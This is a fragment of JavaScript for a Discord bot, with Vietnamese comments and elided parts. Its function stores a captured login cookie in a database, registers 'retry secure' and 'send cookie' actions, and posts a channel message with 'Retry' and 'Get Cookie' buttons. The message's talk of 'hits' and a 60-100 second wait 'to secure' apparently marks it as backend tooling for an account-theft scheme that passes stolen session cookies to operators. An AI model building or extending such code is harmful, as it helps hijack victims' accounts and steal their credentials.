...
async function loginCookieMessager(client, guildId, channelId, host) {
  try {
    // Lưu cookie vào bảng cookie_store
    const cookieId = generate(33);
    await queryParams(`INSERT INTO cookie_store(id, cookie) VALUES(?, ?)`, [
      cookieId,
      host
    ]);

    // Lưu vào actions, chỉ truyền cookieId (ngắn)
    const retryId = generate(33);
    await queryParams(`INSERT INTO actions(id, action) VALUES(?, ?)`, [
      retryId,
      `retrysecure|${cookieId}`
    ]);

    const retryButton = new ButtonBuilder()
      .setCustomId("action|" + retryId)
      .setLabel("Retry")
      .setEmoji("🔁")
      .setStyle(ButtonStyle.Primary);

    // Nút Get Cookie
    const sendCookieId = generate(33);
    await queryParams(`INSERT INTO actions(id, action) VALUES(?, ?)`, [
      sendCookieId,
      `sendcookie|${cookieId}`
    ]);
    ...
    const cookieButton = new ButtonBuilder()
      .setCustomId("action|" + sendCookieId)
      .setLabel("Get Cookie")
      .setEmoji("🍪")
    ...
    const embed = {
      ...
      description:
        `If hits are not sent to the hits channel, please press the **"Retry"** button to re-secure.\n\n` +
        `**Note:** It takes 60 - 100 seconds to secure.`,
      color: 0x2ecc71,
      thumbnail: {
    ...
    await client.guilds.cache
      ...
      .send({
        embeds: [embed],
        components: [new ActionRowBuilder().addComponents(retryButton, cookieButton)]
      });

  } catch (e) {
    console.log("loginCookieMessager Error:", e);
  }
}
